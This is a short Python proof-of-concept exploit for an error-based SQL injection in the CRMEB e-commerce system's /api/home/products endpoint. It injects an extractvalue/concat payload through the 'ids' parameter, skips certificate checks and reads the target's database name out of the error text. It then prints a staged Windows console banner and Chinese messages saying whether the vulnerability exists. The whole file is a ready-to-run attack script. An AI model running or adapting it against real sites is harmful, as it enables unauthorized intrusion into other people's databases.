#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec

import base64
import requests
import urllib3
import sys
import json
import re

urllib3.disable_warnings()

patt = "'~([^']+)'"

def verify(site):
    burp0_url = site + "/api/home/products?page=1&limit=10&type&ids=extractvalue(1,concat(char(126),database()))&selectType=1"
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Encoding": "gzip, deflate", "Connection": "keep-alive"}
    r = requests.get(burp0_url, headers=burp0_headers, verify=False)
    info = re.findall(patt, r.text)
    if len(info) != 0:
        return info[0]
    else:
        return ""


if __name__=="__main__":
    target = sys.argv[1]
    print("Microsoft Windows [版本 10.0.19044.3086]\n(c) Microsoft Corporation。保留所有权利。\n\nD:\VulnSubmit\script>python3 crmeb-api-home-products-sqli.py ",target)
    info = verify(target)
    if info != "":
        print("[+]漏洞存在，获取当前数据库名称为：", info)
    else:
        print("[-]漏洞不存在")
